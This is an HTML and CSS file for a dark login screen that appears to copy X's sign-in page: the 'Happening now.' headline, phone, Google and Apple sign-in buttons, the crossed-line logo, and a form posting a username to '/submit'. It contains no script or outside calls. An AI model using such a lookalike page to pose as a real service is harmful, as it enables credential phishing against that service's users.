<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { min-height: 100%; }
  body {
    background: #000;
    color: #fff;
    font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
    display: grid;
    place-items: center;
    padding: 32px;
  }

  .page {
    width: min(1120px, 100%);
    display: grid;
    grid-template-columns: minmax(320px, 420px) 1fr;
    gap: 48px;
    align-items: center;
  }

  .panel {
    background: rgba(18, 18, 18, 0.92);
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 32px;
    padding: 44px 40px;
    box-shadow: 0 40px 120px rgba(0, 0, 0, 0.45);
    backdrop-filter: blur(18px);
  }

  .headline {
    font-size: clamp(2.1rem, 4vw, 3.4rem);
    line-height: 1.03;
    font-weight: 800;
    letter-spacing: -0.04em;
    max-width: 14ch;
  }

  .actions {
    display: grid;
    gap: 14px;
    margin: 36px 0 28px;
  }

  .button {
    display: flex;
    align-items: center;
    gap: 14px;
    border: 1px solid rgba(255, 255, 255, 0.12);
    background: rgba(255, 255, 255, 0.04);
    color: #fff;
    border-radius: 999px;
    padding: 14px 18px;
    font-size: 0.98rem;
    cursor: pointer;
    transition: background 0.2s ease, border-color 0.2s ease;
    text-decoration: none;
  }

  .button:hover {
    background: rgba(255, 255, 255, 0.12);
    border-color: rgba(255, 255, 255, 0.2);
  }

  .button span {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 1.5rem;
    height: 1.5rem;
    font-size: 1.1rem;
  }

  .button.phone { color: #fff; }
  .button.google { color: #fff; }
  .button.apple { color: #fff; }

  .divider {
    position: relative;
    text-align: center;
    color: rgba(255, 255, 255, 0.65);
    font-size: 0.9rem;
    margin: 24px 0 16px;
  }

  .divider::before,
  .divider::after {
    content: "";
    position: absolute;
    top: 50%;
    width: calc(50% - 2.5em);
    height: 1px;
    background: rgba(255, 255, 255, 0.12);
  }

  .divider::before { left: 0; }
  .divider::after { right: 0; }

  .field {
    display: grid;
    gap: 10px;
    margin-bottom: 20px;
  }

  .field input {
    width: 100%;
    border-radius: 16px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    background: rgba(255, 255, 255, 0.04);
    color: #fff;
    padding: 18px 16px;
    font-size: 1rem;
    outline: none;
    transition: border-color 0.2s ease, box-shadow 0.2s ease;
  }

  .field input::placeholder {
    color: rgba(255, 255, 255, 0.45);
  }

  .field input:focus {
    border-color: rgba(255, 255, 255, 0.32);
    box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.06);
  }

  .submit {
    width: 100%;
    border: none;
    border-radius: 18px;
    padding: 16px 18px;
    background: #fff;
    color: #111;
    font-size: 1rem;
    font-weight: 700;
    cursor: pointer;
    transition: transform 0.2s ease, box-shadow 0.2s ease;
  }

  .submit:hover {
    transform: translateY(-1px);
    box-shadow: 0 22px 50px rgba(255, 255, 255, 0.12);
  }

  .legal {
    font-size: 0.8rem;
    color: rgba(255, 255, 255, 0.55);
    margin-top: 22px;
    line-height: 1.8;
  }

  .legal a {
    color: rgba(255, 255, 255, 0.85);
    text-decoration: none;
  }

  .legal a:hover {
    text-decoration: underline;
  }

  .hero {
    display: grid;
    place-items: center;
    min-height: 520px;
  }

  .hero-graphic {
    position: relative;
    width: 100%;
    max-width: 620px;
    aspect-ratio: 1.05;
    border-radius: 64px;
    background: radial-gradient(circle at top left, rgba(255,255,255,0.08), transparent 38%),
                radial-gradient(circle at bottom right, rgba(255,255,255,0.04), transparent 24%),
                linear-gradient(135deg, rgba(28, 28, 28, 0.98), rgba(4, 4, 4, 0.95));
    box-shadow: inset 0 0 0 1px rgba(255,255,255,0.04), 0 40px 120px rgba(0, 0, 0, 0.4);
    overflow: hidden;
  }

  .hero-graphic::before {
    content: "";
    position: absolute;
    inset: 0;
    background: radial-gradient(circle at center, rgba(255,255,255,0.05), transparent 40%);
  }

  .hero-graphic svg {
    position: absolute;
    inset: 0;
    width: 100%;
    height: 100%;
    display: block;
    fill: none;
    stroke: rgba(255, 255, 255, 0.12);
    stroke-width: 22;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  .hero-graphic svg path {
    stroke: rgba(255, 255, 255, 0.18);
  }

  @media (max-width: 900px) {
    .page { grid-template-columns: 1fr; gap: 28px; }
    .hero { min-height: 380px; }
  }

  @media (max-width: 520px) {
    body { padding: 20px; }
    .panel { padding: 32px 24px; border-radius: 28px; }
    .headline { font-size: 2.4rem; }
  }
</style>
</head>
<body>
  <div class="page">
    <section class="panel">
      <h1 class="headline">Happening now.</h1>

      <div class="actions">
        <a href="#" class="button phone"><span>📞</span> Continue with phone</a>
        <a href="#" class="button google"><span>G</span> Continue with Google</a>
        <a href="#" class="button apple"><span></span> Continue with Apple</a>
      </div>

      <div class="divider">or</div>

      <form action="/submit" method="POST">
        <div class="field">
          <input type="text" name="username" placeholder="Email or username" required>
        </div>
        <button type="submit" class="submit">Continue</button>
      </form>

      <p class="legal">By continuing, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookie Use</a>.</p>
    </section>

    <div class="hero">
      <div class="hero-graphic">
        <svg viewBox="0 0 800 800" aria-hidden="true">
          <path d="M230 160 L570 640" />
          <path d="M570 160 L230 640" />
        </svg>
      </div>
    </div>
  </div>
</body>
</html>
